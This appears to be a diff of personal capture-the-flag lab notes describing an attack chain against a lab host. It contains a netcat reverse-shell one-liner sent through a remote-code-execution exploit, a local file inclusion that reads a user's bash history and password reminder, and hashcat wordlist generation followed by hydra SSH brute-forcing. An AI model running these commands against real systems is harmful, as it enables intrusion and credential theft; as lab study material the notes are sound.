@@ -315,4 +315,30 @@ If you are using python file to get RCE to website, you can also inject reverse 
 --------------------------------------------------------------------------------------------------
 #python3 50477.py -u http://10.10.90.170/
 Enter Command $rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.73.176 3333 >/tmp/f
+_________________________________________________________________________________________________________________________________________________________________________________________________
+#curl http://10.10.109.108/index.php?page=php://filter/resource=/home/blue/.bash_history
 
+When I use php wrapper to see .bash_history > I see that code 
+-------------------------------------------------------------
+hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
+
+It uses the word under .reminder and turn that with multiple words with best64.rule and save that in passlist.txt
+
+#curl http://10.10.109.108/index.php?page=php://filter/resource=/home/blue/.reminder
+sup3r_p@s$w0rd! (under .reminder)
+
+So, I create .reminder and save that sup3r_p@s$w0rd! > after that run that code
+#hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
+
+Finally, brutefroce the password with hydra
+--------------------------------------------
+#hydra -l blue -P passlist.txt ssh://$IP
+_________________________________________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+
+
+_________________________________________________________________________________________________________________________________________________________________________________________________
